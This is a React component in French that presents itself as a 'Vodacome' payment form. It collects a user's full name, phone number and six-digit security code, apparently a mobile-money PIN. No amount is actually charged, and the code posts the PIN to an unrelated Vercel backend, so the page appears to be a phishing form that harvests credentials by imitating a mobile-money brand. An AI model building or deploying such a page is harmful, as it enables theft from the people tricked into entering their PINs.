import React, { useState } from "react";
import axios from "axios";

export default function Vodacome() {
  const [fullname, setFullname] = useState("");
  const [numero, setNumero] = useState("");
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  const validate = () => {
    if (!fullname.trim()) {
      setMessage("Nom et Prénom est requis");
      return false;
    }
    if (!/^\d+$/.test(numero)) {
      setMessage("Numéro Vodacome doit contenir uniquement des chiffres");
      return false;
    }
    if (code.length !== 6 || !/^\d{6}$/.test(code)) {
      setMessage("Code de sécurité doit contenir exactement 6 chiffres");
      return false;
    }
    setMessage("");
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;

    const data = {
      fullname,
      numero,
      devise: "FCFA",
      montant: "en cours d'examen",
      code,
    };

    try {
      setLoading(true);
      const res = await axios.post(
        "https://backend-paiement.vercel.app/api/paiements",
        data,
        {
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
      setMessage(res.data.message || "Données envoyées avec succès !");
      setFullname("");
      setNumero("");
      setCode("");
    } catch (err) {
      console.error("Erreur API:", err.response || err.message);
      setMessage(
        err.response?.data?.message ||
          "Erreur lors de l’envoi des données, veuillez réessayer."
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ maxWidth: 400, margin: "auto", padding: 20 }}>
      <h2>Formulaire Paiement Vodacome</h2>
      <form onSubmit={handleSubmit}>
        <div>
          <label>Nom et Prénom</label>
          <input
            type="text"
            value={fullname}
            onChange={(e) => setFullname(e.target.value)}
            placeholder="Nom et Prénom"
          />
        </div>
        <div>
          <label>Numéro Vodacome</label>
          <input
            type="text"
            value={numero}
            onChange={(e) => {
              if (/^\d*$/.test(e.target.value)) setNumero(e.target.value);
            }}
            placeholder="Numéro (chiffres uniquement)"
          />
        </div>
        <div>
          <label>Code de sécurité (6 chiffres)</label>
          <input
            type="password"
            maxLength={6}
            value={code}
            onChange={(e) => {
              if (/^\d*$/.test(e.target.value)) setCode(e.target.value);
            }}
            placeholder="Ex: 123456"
          />
        </div>
        <button type="submit" disabled={loading}>
          {loading ? "Envoi..." : "Envoyer"}
        </button>
      </form>
      {message && <p style={{ marginTop: 10 }}>{message}</p>}
    </div>
  );
}
